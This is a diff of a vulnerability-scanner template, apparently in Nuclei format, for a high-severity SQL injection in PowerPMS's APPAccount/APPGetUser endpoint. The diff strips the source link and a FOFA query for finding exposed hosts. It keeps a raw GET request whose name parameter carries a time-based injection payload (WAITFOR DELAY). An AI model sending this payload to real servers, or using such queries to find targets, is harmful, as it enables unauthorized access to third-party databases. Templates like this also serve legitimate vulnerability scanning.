@@ -3,12 +3,8 @@ info:
   name: 上海普华科技发展股份有限公司PowerPMS-APPGetUser存在SQL注入
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gpzuzzgcleh4ncu0'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gpzuzzgcleh4ncu0
-    fofa: app="普华科技-PowerPMS"
 http:
 - raw:
   - 'GET /APPAccount/APPGetUser?name=1%27%29%3BWAITFOR+DELAY+%270%3A0%3A5%27-- HTTP/1.1
